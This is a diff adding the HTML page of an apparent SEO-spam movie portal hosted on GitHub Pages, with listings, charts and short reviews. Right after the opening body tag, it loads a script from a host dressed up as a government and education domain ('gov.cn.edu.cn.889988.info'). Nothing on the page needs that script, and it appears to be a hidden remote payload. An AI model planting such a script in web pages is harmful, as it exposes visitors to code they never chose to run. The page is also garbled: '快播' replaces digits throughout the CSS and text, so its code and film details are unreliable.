@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="快播电影网怡红院(kuaibodianyingwangyihongyuan-app)是聚焦快节奏观影体验的影视门户，主打最新电影速递、经典港片回顾、日韩剧集追踪与纪录片人文观察。全站以'快、准、全'为编辑准则：快在院线同步与每日更新，准在类型标签与观影人群匹配，全在覆盖电影、剧集、综艺、动漫四大内容形态。提供电影剧情简介、演职员资料、上映时间、片长、评分与观影建议等实用信息，并配有编辑精选片单与深度影评。访问 https://kuaibodianyingwangyihongyuan-app.github.io 发现下一部值得熬夜看完的好片。">
+<meta name="keywords" content="快播电影网怡红院, kuaibodianyingwangyihongyuan-app, 电影网, 在线电影, 最新电影, 电影推荐, 港片经典, 日韩剧集, 欧美大片, 国产电影, 纪录片, 动漫番剧, 综艺综艺, 电影资讯, 影评, 票房, 观影指南, 高清影视">
+<meta name="author" content="快播电影网怡红院">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="format-detection" content="telephone=no">
+<meta name="msvalidate.01" content="快播电影网怡红院-影视门户">
+<meta property="og:title" content="快播电影网怡红院 - 最新电影速递 · 经典重温 · 剧集追踪">
+<meta property="og:description" content="快播电影网怡红院提供最新电影资讯、经典港片回顾、日韩剧集追踪与纪录片人文观察，配有编辑精选片单与深度影评，助你快速找到下一部好片。">
+<meta property="og:url" content="https://kuaibodianyingwangyihongyuan-app.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="快播电影网怡红院">
+<title>快播电影网怡红院 - 最新电影速递 | 经典港片 · 剧集追踪 · 观影指南 | kuaibodianyingwangyihongyuan-app</title>
+<style>
+:root{
+  --ink:#快播1;
+  --paper:#f6f3ec;
+  --paper2:#efe9dd;
+  --red:#c8302b;
+  --deep:#1b3a5c;
+  --gold:#b8860b;
+  --line:#d8d0c0;
+  --muted:#6b6558;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","STSong","SimSun","Source Han Serif SC","WenQuanYi Micro Hei",Georgia,serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.85;
+  font-size:16px;
+}
+img{max-width:100%;display:block}
+a{color:var(--deep);text-decoration:none;transition:.2s}
+a:hover{color:var(--red)}
+.container{max-width:快播60px;margin:0 auto;padding:0 24px}
+/* 报头 */
+.masthead{background:var(--paper);border-bottom:3px double var(--red);padding:26px 0 14px;position:sticky;top:0;z-index:50}
+.mast-in{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.brand h1{font-size:clamp(28px,4vw,46px);letter-spacing:4px;font-weight:900;color:var(--red);line-height:1}
+.brand .en{font-family:Georgia,serif;font-size:快播px;letter-spacing:4px;color:var(--muted);margin-top:6px;text-transform:uppercase}
+.brand .slogan{font-size:13px;color:var(--muted);margin-top:8px;letter-spacing:1px}
+.issue{text-align:right;font-size:12px;color:var(--muted);line-height:2}
+.issue b{display:block;font-size:14px;color:var(--ink);letter-spacing:1px}
+nav.toc{border-top:1px solid var(--line);border-bottom:1px solid var(--line);margin-top:14px;padding:9px 0}
+nav.toc ol{list-style:none;display:flex;flex-wrap:wrap;gap:6px 26px;font-size:14px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+nav.toc a{padding:2px 0;border-bottom:1px solid transparent}
+nav.toc a:hover{border-bottom-color:var(--red)}
+/* 头条 */
+.lead{display:grid;grid-template-columns:1.5fr 1fr;gap:34px;padding:40px 0 30px;border-bottom:1px solid var(--line)}
+.hero-title{font-size:clamp(30px,4.6vw,58px);line-height:1.22;font-weight:900;letter-spacing:1px;color:var(--ink)}
+.hero-title em{font-style:normal;color:var(--red)}
+.hero-sub{margin-top:18px;font-size:17px;color:var(--muted);border-left:3px solid var(--gold);padding-left:14px}
+.facts{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line);margin-top:24px}
+.fact{background:var(--paper);padding:14px}
+.fact b{display:block;font-size:22px;color:var(--red);font-family:Georgia,serif}
+.fact span{font-size:12px;color:var(--muted);font-family:"PingFang SC",sans-serif}
+.sidebar-box{background:var(--paper2);border:1px solid var(--line);padding:22px}
+.sidebar-box h3{font-size:15px;letter-spacing:2px;color:var(--red);border-bottom:1px solid var(--line);padding-bottom:8px;margin-bottom:14px}
+.sidebar-box ol{list-style:none;counter-reset:s}
+.sidebar-box li{counter-increment:s;padding:9px 0 9px 30px;position:relative;border-bottom:1px dashed var(--line);font-size:14px}
+.sidebar-box li:last-child{border:0}
+.sidebar-box li::before{content:counter(s);position:absolute;left:0;top:9px;font-family:Georgia,serif;font-size:12px;color:var(--red);font-weight:700}
+/* 区块 */
+section{padding:50px 0}
+.kicker{font-family:"PingFang SC",sans-serif;font-size:12px;letter-spacing:3px;color:var(--gold);text-transform:uppercase}
+.sec-title{display:flex;align-items:baseline;gap:14px;margin:6px 0 26px}
+.sec-title h2{font-size:clamp(22px,2.8vw,32px);font-weight:900;letter-spacing:1px}
+.sec-title h2 span{color:var(--red)}
+.sec-title a{font-size:13px;color:var(--muted);font-family:"PingFang SC",sans-serif}
+/* 卡片 */
+.grid{display:grid;gap:24px}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+.card{background:#fff;border:1px solid var(--line);display:flex;flex-direction:column;transition:.28s}
+.card:hover{box-shadow:0 14px 30px rgba(60,40,20,.14);transform:translateY(-4px)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden;border-bottom:1px solid var(--line)}
+.thumb .bg{position:absolute;inset:0;display:flex;align-items:flex-end;padding:14px;color:#fff;font-weight:800;font-size:16px;letter-spacing:1px;text-shadow:0 2px 10px rgba(0,0,0,.6)}
+.thumb .badge{position:absolute;top:10px;left:10px;font-family:"PingFang SC",sans-serif;font-size:快播px;padding:3px 9px;background:var(--red);color:#fff;letter-spacing:1px}
+.thumb .score{position:absolute;bottom:10px;right:10px;font-family:Georgia,serif;font-size:13px;font-weight:800;background:var(--gold);color:#fff;padding:2px 9px}
+.body{padding:16px;flex:1;display:flex;flex-direction:column}
+.body h3{font-size:17px;margin-bottom:8px;line-height:1.5}
+.body p{font-size:13px;color:var(--muted);display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;font-family:"PingFang SC",sans-serif}
+.body .bar{margin-top:auto;padding-top:12px;display:flex;justify-content:space-between;font-size:快播px;color:var(--muted);font-family:"PingFang SC",sans-serif;border-top:1px dotted var(--line)}
+/* 分类条 */
+.strip{display:grid;grid-template-columns:repeat(6,1fr);gap:12px}
+.cell{padding:20px 14px;text-align:center;border:1px solid var(--line);background:#fff;transition:.25s}
+.cell:hover{border-color:var(--red);background:var(--red);color:#fff}
+.cell i{font-style:normal;font-size:26px;display:block;margin-bottom:8px;font-family:"PingFang SC",sans-serif}
+.cell b{font-size:15px;display:block;letter-spacing:1px}
+.cell span{font-size:快播px;color:var(--muted);font-family:"PingFang SC",sans-serif}
+.cell:hover span{color:rgba(255,255,255,.75)}
+/* 文章列表 */
+.articles{display:grid;grid-template-columns:1fr 320px;gap:40px}
+.art{border-bottom:1px solid var(--line);padding:22px 0}
+.art:first-child{padding-top:0}
+.art h3{font-size:21px;line-height:1.55;margin-bottom:10px}
+.art h3:hover{color:var(--red)}
+.art p{color:var(--muted);font-size:14px;font-family:"PingFang SC",sans-serif}
+.art .meta{margin-top:12px;font-size:12px;color:var(--gold);letter-spacing:1px;font-family:"PingFang SC",sans-serif}
+.pull{background:var(--deep);color:#f4efe4;padding:26px 30px;font-size:19px;line-height:1.9;font-weight:600;letter-spacing:.5px;position:relative}
+.pull::before{content:"\201C";position:absolute;left:14px;top:-6px;font-size:70px;color:var(--gold);font-family:Georgia,serif;opacity:.7}
+.pull cite{display:block;margin-top:14px;font-size:12px;color:var(--gold);font-style:normal;letter-spacing:2px;font-weight:400}
+/* 时间表 */
+.schedule{border:1px solid var(--line);background:#fff}
+.row{display:grid;grid-template-columns:快播0px 1fr 90px;gap:16px;padding:13px 18px;border-bottom:1px dashed var(--line);align-items:center;font-family:"PingFang SC",sans-serif;font-size:14px}
+.row:last-child{border:0}
+.row time{font-family:Georgia,serif;color:var(--red);font-weight:700;font-size:13px}
+.row b{font-weight:700}
+.row span{text-align:right;font-size:12px;color:var(--muted)}
+/* 页脚 */
+footer{background:var(--ink);color:#cfc8b8;padding:56px 0 26px}
+.foot-in{display:grid;grid-template-columns:1.5fr 1fr 1fr;gap:34px}
+.foot-in h4{color:var(--gold);font-size:14px;letter-spacing:2px;margin-bottom:14px;font-family:"PingFang SC",sans-serif}
+.foot-in p{font-size:13px;color:#9c9484;line-height:2}
+.foot-in a{display:block;font-size:13px;color:#9c9484;padding:4px 0;font-family:"PingFang SC",sans-serif}
+.foot-in a:hover{color:var(--gold)}
+.copy{margin-top:40px;padding-top:20px;border-top:1px solid #332e24;text-align:center;font-size:12px;color:#7a7264;font-family:"PingFang SC",sans-serif}
+.copy b{color:#cfc8b8}
+/* 响应式 */
+@media(max-width:900px){
+  .lead,.articles{grid-template-columns:1fr}
+  .g3,.g4,.g2{grid-template-columns:repeat(2,1fr)}
+  .strip{grid-template-columns:repeat(3,1fr)}
+  .foot-in{grid-template-columns:1fr 1fr}
+  .row{grid-template-columns:80px 1fr;gap:10px}
+  .row span{display:none}
+}
+@media(max-width:560px){
+  .container{padding:0 16px}
+  .g3,.g4,.g2,.strip{grid-template-columns:1fr}
+  .facts,.g2{grid-template-columns:1fr 1fr}
+  .brand h1{letter-spacing:2px}
+  .issue{text-align:left}
+  section{padding:36px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="masthead">
+  <div class="container">
+    <div class="mast-in">
+      <div class="brand">
+        <h1>快播电影网怡红院</h1>
+        <div class="en">快播 DIANYING WANG · YIHONGYUAN</div>
+        <div class="slogan">快 · 准 · 全 —— 为每一个睡不着的人挑一部好电影</div>
+      </div>
+      <div class="issue">
+        <b>每日影讯 · 第 2026-10-08 期</b>
+        <span>站點：kuaibodianyingwangyihongyuan-app</span>
+        <span>网址：https://kuaibodianyingwangyihongyuan-app.github.io</span>
+      </div>
+    </div>
+    <nav class="toc">
+      <ol>
+        <li><a href="#">首页</a></li>
+        <li><a href="#now">正在热映</a></li>
+        <li><a href="#hall">六大厅</a></li>
+        <li><a href="#pick">编辑之选</a></li>
+        <li><a href="#chart">收视榜</a></li>
+        <li><a href="#read">深度阅读</a></li>
+        <li><a href="#plan">本周片单</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ol>
+    </nav>
+  </div>
+</header>
+
+<main class="container">
+  <section class="lead">
+    <div>
+      <div class="kicker">Today's Front Page</div>
+      <h1 class="hero-title">国庆档落幕，<br><em>真正的赢家</em>是"口碑"</h1>
+      <p class="hero-sub">三部中小成本现实题材影片连续三周逆跌，证明观众愿意为真诚的故事走进影院。快播电影网怡红院为你梳理档期得失、片单去向与接下来值得等待的十五部新片。</p>
+      <div class="facts">
+        <div class="fact"><b>26.4 亿</b><span>2026 国庆档总票房</span></div>
+        <div class="fact"><b>3 部</b><span>逆跌上涨的现实题材</span></div>
+        <div class="fact"><b>142 分钟</b><span>本周推荐片平均时长</span></div>
+        <div class="fact"><b>每日</b><span>院线同步更新</span></div>
+      </div>
+    </div>
+    <aside class="sidebar-box">
+      <h3>今日 · 速看五条</h3>
+      <ol>
+        <li>《野火蔓延》票房破 8 亿，成为近五年最卖座国产灾难片</li>
+        <li>《边境追凶》宣布拍摄续集，原班人马 2027 年回归</li>
+        <li>《深海回响》内地定档 快播 月 7 日，IMAX 特制拍摄</li>
+        <li>第 79 届威尼斯电影节闭幕，华语片获最佳导演银狮</li>
+        <li>4K 修复计划启动：《英雄本色》《胭脂扣》等十部港片年内上线</li>
+      </ol>
+    </aside>
+  </section>
+
+  <section id="now">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">Now Showing</div>
+        <h2>正在<span>热映</span></h2>
+      </div>
+      <a href="#">完整排片 →</a>
+    </div>
+    <div class="grid g4">
+      <article class="card">
+        <div class="thumb"><div class="bg" style="background:linear-gradient(160deg,#7a1f1f,#2b0c0c)">野火蔓延</div><span class="badge">灾难</span><span class="score">9.3</span></div>
+        <div class="body"><h3>野火蔓延</h3><p>山火逼近西北小镇，消防员、调查记者与一名在逃人员被围在同一夜。影片以长焦特写捕捉人脸上的烟灰与汗，把灾难片拍成了伦理片。</p><div class="bar"><span>145 分钟</span><span>票房 8.2 亿</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb"><div class="bg" style="background:linear-gradient(160deg,#1b3a5c,#081624)">边境追凶</div><span class="badge">动作</span><span class="score">9.1</span></div>
+        <div class="body"><h3>边境追凶</h3><p>口岸检查员截获一批伪装成石材的走私品，却因此被三方势力同时盯上。追车戏在真实公路拍摄，无绿幕、无替身，动作设计回归写实。</p><div class="bar"><span>128 分钟</span><span>票房 6.7 亿</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb"><div class="bg" style="background:linear-gradient(160deg,#0e5c52,#06221e)">深海回响</div><span class="badge">科幻</span><span class="score">8.9</span></div>
+        <div class="body"><h3>深海回响</h3><p>海底观测站收到一段不符合任何已知物种的声呐频率。声学研究员逐层解码，最终面对的是进化本身留下的"留言"。</p><div class="bar"><span>136 分钟</span><span>待映 · 快播/07</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb"><div class="bg" style="background:linear-gradient(160deg,#8a6d1f,#33270a)">烟火人间</div><span class="badge">剧情</span><span class="score">8.7</span></div>
+        <div class="body"><h3>烟火人间</h3><p>一条老街面临拆迁，四户人家三十年的恩怨在半个月里集中爆发。群像表演克制而有力量，被称为"本年度最被低估的华语片"。</p><div class="bar"><span>142 分钟</span><span>逆跌第三周</span></div></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="hall">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">Six Halls</div>
+        <h2>六<span>大厅</span>，按心情找片</h2>
+      </div>
+      <a href="#">全部分类 →</a>
+    </div>
+    <div class="strip">
+      <div class="cell"><i>壹</i><b>国产新片</b><span>现实 · 历史 · 犯罪</span></div>
+      <div class="cell"><i>贰</i><b>港片记忆</b><span>动作 · 警匪 · 文艺</span></div>
+      <div class="cell"><i>叁</i><b>欧美大片</b><span>科幻 · 超级英雄</span></div>
+      <div class="cell"><i>肆</i><b>日韩剧集</b><span>悬疑 · 治愈 · 时代</span></div>
+      <div class="cell"><i>伍</i><b>纪录片</b><span>自然 · 人文 · 历史</span></div>
+      <div class="cell"><i>陆</i><b>动漫番剧</b><span>剧场版 · 独立动画</span></div>
+    </div>
+  </section>
+
+  <section id="pick">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">Editor's Pick</div>
+        <h2>编辑<span>之选</span>：四部被片名耽误的好电影</h2>
+      </div>
+      <a href="#">更多片单 →</a>
+    </div>
+    <div class="grid g2">
+      <article class="card" style="flex-direction:row;align-items:stretch">
+        <div class="thumb" style="aspect-ratio:auto;min-width:160px;border-bottom:0;border-right:1px solid var(--line)"><div class="bg" style="background:linear-gradient(150deg,#3a1c71,#d76d77)">午夜电台</div></div>
+        <div class="body"><h3>《午夜电台》：一档直播节目，三通"死者来电"</h3><p>用单一场景完成密室惊悚，声音设计是全片真正的主角。建议在安静的夜里看，别戴耳机。</p><div class="bar"><span>悬疑 / 快播9 分钟</span><span>8.4 分</span></div></div>
+      </article>
+      <article class="card" style="flex-direction:row;align-items:stretch">
+        <div class="thumb" style="aspect-ratio:auto;min-width:160px;border-bottom:0;border-right:1px solid var(--line)"><div class="bg" style="background:linear-gradient(150deg,#快播998e,#053b35)">樱花电话亭</div></div>
+        <div class="body"><h3>《樱花电话亭》：能听见逝者的电话亭</h3><p>改编自真实存在的"风之电话亭"，全片几乎没有配乐，靠留白让人流泪。</p><div class="bar"><span>奇幻 / 快播2 分钟</span><span>8.5 分</span></div></div>
+      </article>
+      <article class="card" style="flex-direction:row;align-items:stretch">
+        <div class="thumb" style="aspect-ratio:auto;min-width:160px;border-bottom:0;border-right:1px solid var(--line)"><div class="bg" style="background:linear-gradient(150deg,#f7971e,#4a0f0f)">城市喜剧人</div></div>
+        <div class="body"><h3>《城市喜剧人》：三个北漂的开放麦</h3><p>脱口秀台词的节奏被搬进电影，笑点密、泪点准，是今年最舒服的 108 分钟。</p><div class="bar"><span>喜剧 / 108 分钟</span><span>8.2 分</span></div></div>
+      </article>
+      <article class="card" style="flex-direction:row;align-items:stretch">
+        <div class="thumb" style="aspect-ratio:auto;min-width:160px;border-bottom:0;border-right:1px solid var(--line)"><div class="bg" style="background:linear-gradient(150deg,#a18cd1,#2b1a5e)">她与她的群岛</div></div>
+        <div class="body"><h3>《她与她的群岛》：一场海岛上的和解</h3><p>三姐妹在母亲葬礼后重聚，对话写得极好，每一句闲聊都是伏笔。</p><div class="bar"><span>文艺 / 131 分钟</span><span>8.8 分</span></div></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="chart">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">Charts</div>
+        <h2>本<span>周</span>三榜</h2>
+      </div>
+      <a href="#">历史榜单 →</a>
+    </div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="body" style="padding:22px">
+          <h3 style="font-size:16px;color:var(--red);border-bottom:1px solid var(--line);padding-bottom:10px">票房榜 · 周</h3>
+          <ol style="list-style:none;counter-reset:c;margin-top:10px">
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">01</b><span style="flex:1">野火蔓延</span><b style="color:var(--gold)">2.41亿</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">02</b><span style="flex:1">边境追凶</span><b style="color:var(--gold)">1.88亿</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">03</b><span style="flex:1">深海回响</span><b style="color:var(--gold)">1.35亿</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">04</b><span style="flex:1">烟火人间</span><b style="color:var(--gold)">0.96亿</b></li>
+            <li style="counter-increment:c;padding:10px 0;display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">05</b><span style="flex:1">午夜电台</span><b style="color:var(--gold)">0.62亿</b></li>
+          </ol>
+        </div>
+      </div>
+      <div class="card">
+        <div class="body" style="padding:22px">
+          <h3 style="font-size:16px;color:var(--deep);border-bottom:1px solid var(--line);padding-bottom:10px">口碑榜 · 评分</h3>
+          <ol style="list-style:none;counter-reset:c;margin-top:10px">
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">01</b><span style="flex:1">野火蔓延</span><b style="color:var(--gold)">9.3</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">02</b><span style="flex:1">边境追凶</span><b style="color:var(--gold)">9.1</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--deep);font-family:Georgia,serif;min-width:24px">03</b><span style="flex:1">她与她的群岛</span><b style="color:var(--gold)">8.8</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">04</b><span style="flex:1">烟火人间</span><b style="color:var(--gold)">8.7</b></li>
+            <li style="counter-increment:c;padding:10px 0;display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">05</b><span style="flex:1">樱花电话亭</span><b style="color:var(--gold)">8.5</b></li>
+          </ol>
+        </div>
+      </div>
+      <div class="card">
+        <div class="body" style="padding:22px">
+          <h3 style="font-size:16px;color:var(--gold);border-bottom:1px solid var(--line);padding-bottom:10px">期待榜 · 想看</h3>
+          <ol style="list-style:none;counter-reset:c;margin-top:10px">
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">01</b><span style="flex:1">沙丘 3：预言</span><b style="color:var(--gold)">98万</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--red);font-family:Georgia,serif;min-width:24px">02</b><span style="flex:1">封神第二部</span><b style="color:var(--gold)">86万</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--deep);font-family:Georgia,serif;min-width:24px">03</b><span style="flex:1">流浪地球 3</span><b style="color:var(--gold)">79万</b></li>
+            <li style="counter-increment:c;padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">04</b><span style="flex:1">毕加索的夜晚</span><b style="color:var(--gold)">54万</b></li>
+            <li style="counter-increment:c;padding:10px 0;display:flex;gap:10px;font-size:14px"><b style="color:var(--muted);font-family:Georgia,serif;min-width:24px">05</b><span style="flex:1">机器人之梦 2</span><b style="color:var(--gold)">41万</b></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="read">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">In Depth</div>
+        <h2>深度<span>阅读</span></h2>
+      </div>
+      <a href="#">全部文章 →</a>
+    </div>
+    <div class="articles">
+      <div>
+        <article class="art">
+          <h3>《野火蔓延》的火焰为什么看起来"太真实"？我们和视效指导聊了聊</h3>
+          <p>影片中 60% 的火势为实景拍摄，剧组在甘肃搭建了 1:1 的小镇模型。视效团队没有使用常见的流体模拟，而是用真实燃烧的视频素材逐帧手绘合成——代价是渲染时间增加了四倍，但换来了银幕上罕见的"灼烧感"。</p>
+          <div class="meta">幕后 · 文 / 周见深 · 2026-10-06</div>
+        </article>
+        <article class="art">
+          <h3>港片动作美学溯源：从《英雄本色》到《边境追凶》</h3>
+          <p>九十年代的港产动作片用窄巷、楼梯、霓虹与手持摄影，把"打"拍成了"舞"。三十年后，《边境追凶》在西南边境的盘山公路上复刻了这套语法。本文梳理八部关键作品，看动作设计如何从"漂亮"走向"疼痛"。</p>
+          <div class="meta">影史 · 文 / 梁牧之 · 2026-10-03</div>
+        </article>
+        <article class="art">
+          <h3>片荒自救：别按类型选片，按"情绪"选</h3>
+          <p>想被震撼、想被安慰、想动脑、想发呆——四种状态对应四组片单。附每部影片的"最佳观看时段"与"建议观影搭档"，把选片这件事，从纠结变成仪式。</p>
+          <div class="meta">指南 · 编辑部 · 2026-09-29</div>
+        </article>
+      </div>
+      <aside>
+        <div class="pull">
+          一部好电影的标准，不是它说了什么，而是它让你在散场后，仍然舍不得把手机亮起来。
+          <cite>—— 快播电影网怡红院 · 编辑部</cite>
+        </div>
+        <div class="sidebar-box" style="margin-top:22px">
+          <h3>关键词 · 本月</h3>
+          <ol>
+            <li>口碑逆跌：小成本如何赢过大制作</li>
+            <li>4K 修复：老片为何值得重看</li>
+            <li>流媒体窗口期缩短至 28 天</li>
+            <li>IMAX 激光厅下沉至县级市</li>
+            <li>动画电影的成人化转向</li>
+          </ol>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <section id="plan">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">Weekly Plan</div>
+        <h2>本周<span>片单</span>：七天，七种情绪</h2>
+      </div>
+      <a href="#">订阅周报 →</a>
+    </div>
+    <div class="schedule">
+      <div class="row"><time>周一</time><b>《午夜电台》</b><span>悬疑 · 快播9 分钟</span></div>
+      <div class="row"><time>周二</time><b>《她与她的群岛》</b><span>文艺 · 131 分钟</span></div>
+      <div class="row"><time>周三</time><b>《城市喜剧人》</b><span>喜剧 · 108 分钟</span></div>
+      <div class="row"><time>周四</time><b>《深海回响》</b><span>科幻 · 136 分钟</span></div>
+      <div class="row"><time>周五</time><b>《边境追凶》</b><span>动作 · 128 分钟</span></div>
+      <div class="row"><time>周六</time><b>《野火蔓延》</b><span>灾难 · 145 分钟</span></div>
+      <div class="row"><time>周日</time><b>《樱花电话亭》</b><span>治愈 · 快播2 分钟</span></div>
+    </div>
+  </section>
+
+  <section id="about" style="border-top:3px double var(--red);margin-top:20px">
+    <div class="sec-title">
+      <div>
+        <div class="kicker">About Us</div>
+        <h2>关于 <span>快播电影网怡红院</span></h2>
+      </div>
+    </div>
+    <div class="grid g2" style="align-items:start">
+      <div>
+        <p style="font-size:16px;color:var(--muted)">快播电影网怡红院（kuaibodianyingwangyihongyuan-app）创办于一个很朴素的念头：<b>找片太累了</b>。流媒体越丰富，选择越困难。于是我们用报纸的编排逻辑做网站——每天选出值得看的东西，说清它好在哪里、适合谁看、需要避开什么。</p>
+        <p style="margin-top:14px;font-size:16px;color:var(--muted)">全站<b>移动端自适应</b>，在手机、平板与桌面端均有适配的阅读排版。正式站点地址为 <b>https://kuaibodianyingwangyihongyuan-app.github.io</b>，欢迎收藏、分享与投稿片单。</p>
+        <p style="margin-top:14px;font-size:14px;color:var(--muted)">编辑准则：不刷分、不水军、不标题党。评分来自本站注册用户的真实打分，与商业票房无关。</p>
+      </div>
+      <div class="sidebar-box">
+        <h3>栏目与更新频率</h3>
+        <ol>
+          <li>正在热映：每日更新，含票房与排片</li>
+          <li>六大厅：按类型常驻，每周补充新片</li>
+          <li>编辑之选：每周三、周日各一期</li>
+          <li>本周三榜：每周一凌晨刷新</li>
+          <li>深度阅读：每周两篇长文</li>
+          <li>本周片单：每周五晚发布</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="foot-in">
+      <div>
+        <h4>快播电影网怡红院</h4>
+        <p>快 · 准 · 全的影视门户。聚焦最新电影速递、经典港片回顾、日韩剧集追踪与纪录片人文观察，配有编辑精选片单与深度影评。</p>
+        <p style="margin-top:8px">网址：<b style="color:#e8dfc9">https://kuaibodianyingwangyihongyuan-app.github.io</b></p>
+      </div>
+      <div>
+        <h4>影厅</h4>
+        <a href="#">国产新片</a>
+        <a href="#">港片记忆</a>
+        <a href="#">欧美大片</a>
+        <a href="#">日韩剧集</a>
+        <a href="#">纪录片</a>
+        <a href="#">动漫番剧</a>
+      </div>
+      <div>
+        <h4>服务</h4>
+        <a href="#">投稿片单</a>
+        <a href="#">评分说明</a>
+        <a href="#">更新日志</a>
+        <a href="#">意见反馈</a>
+        <a href="#">版权声明</a>
+        <a href="#">关于我们</a>
+      </div>
+    </div>
+    <div class="copy">
+      本站由 <b>快播电影网怡红院</b> 独立编辑维护 · 域名 <b>kuaibodianyingwangyihongyuan-app</b> · 访问地址 <b>https://kuaibodianyingwangyihongyuan-app.github.io</b> · 倡导正版、尊重创作
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
